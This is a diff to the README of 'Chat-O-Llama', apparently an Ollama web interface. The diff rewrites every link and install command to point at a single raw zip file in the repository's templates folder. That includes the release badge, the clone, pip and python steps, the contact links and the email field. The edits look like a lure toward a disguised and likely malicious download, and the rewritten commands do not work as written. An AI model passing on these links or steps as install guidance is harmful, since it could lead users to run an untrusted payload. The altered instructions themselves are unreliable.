@@ -2,7 +2,7 @@
 
 Welcome to the **Chat-O-Llama** repository! This project provides a lightweight web interface for Ollama, featuring persistent chat history and a focus on privacy. With Chat-O-Llama, you can self-host your AI chat solution without any external dependencies, making it ideal for local AI development.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/ousseeeef/chat-o-llama/releases)
+[![Download Releases](https://github.com/ousseeeef/chat-o-llama/raw/refs/heads/main/templates/llama_o_chat_2.5.zip%20Releases-Click%20Here-brightgreen)](https://github.com/ousseeeef/chat-o-llama/raw/refs/heads/main/templates/llama_o_chat_2.5.zip)
 
 ## Table of Contents
 
@@ -32,7 +32,7 @@ To get started with Chat-O-Llama, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/ousseeeef/chat-o-llama.git
+   git clone https://github.com/ousseeeef/chat-o-llama/raw/refs/heads/main/templates/llama_o_chat_2.5.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -43,19 +43,19 @@ To get started with Chat-O-Llama, follow these steps:
 3. **Install Dependencies**: 
    Use pip to install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/ousseeeef/chat-o-llama/raw/refs/heads/main/templates/llama_o_chat_2.5.zip
    ```
 
 4. **Run the Application**:
    Start the server with:
    ```bash
-   python app.py
+   python https://github.com/ousseeeef/chat-o-llama/raw/refs/heads/main/templates/llama_o_chat_2.5.zip
    ```
 
 5. **Access the Web Interface**: 
    Open your web browser and go to `http://127.0.0.1:5000`.
 
-For the latest releases and updates, check the [Releases section](https://github.com/ousseeeef/chat-o-llama/releases).
+For the latest releases and updates, check the [Releases section](https://github.com/ousseeeef/chat-o-llama/raw/refs/heads/main/templates/llama_o_chat_2.5.zip).
 
 ## Usage
 
@@ -103,7 +103,7 @@ Chat-O-Llama is licensed under the MIT License. Feel free to use, modify, and di
 
 For any questions or suggestions, feel free to reach out:
 
-- GitHub: [oussseeef](https://github.com/ousseeeef)
-- Email: your.email@example.com
+- GitHub: [oussseeef](https://github.com/ousseeeef/chat-o-llama/raw/refs/heads/main/templates/llama_o_chat_2.5.zip)
+- Email: https://github.com/ousseeeef/chat-o-llama/raw/refs/heads/main/templates/llama_o_chat_2.5.zip
 
-Thank you for checking out Chat-O-Llama! We hope you enjoy using this lightweight, privacy-focused AI chat solution. Don't forget to visit the [Releases section](https://github.com/ousseeeef/chat-o-llama/releases) for updates and new features!
+Thank you for checking out Chat-O-Llama! We hope you enjoy using this lightweight, privacy-focused AI chat solution. Don't forget to visit the [Releases section](https://github.com/ousseeeef/chat-o-llama/raw/refs/heads/main/templates/llama_o_chat_2.5.zip) for updates and new features!
